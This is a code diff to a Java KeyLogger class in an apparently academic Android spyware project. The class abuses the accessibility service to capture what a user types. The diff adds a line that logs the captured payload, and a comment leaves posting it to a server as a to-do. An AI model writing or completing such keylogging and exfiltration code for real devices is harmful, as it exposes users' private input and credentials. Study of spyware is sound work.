@@ -2,11 +2,13 @@ package edu.wisc.ece.androidspyware;
 
 import android.accessibilityservice.AccessibilityService;
 import android.os.AsyncTask;
+import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
 import java.sql.Timestamp;
 
 public class KeyLogger extends AccessibilityService {
+
     /**
      * This method is called whenever the user types, touches, or interacts with the device.
      * https://developer.android.com/reference/android/view/accessibility/AccessibilityEvent
@@ -44,6 +46,8 @@ public class KeyLogger extends AccessibilityService {
         protected Void doInBackground(String... params) {
             try {
                 String payload = params[0];
+
+                Log.d("KeyLogger", payload);
 
                 //to-do: post to server
             } catch (Exception e) {
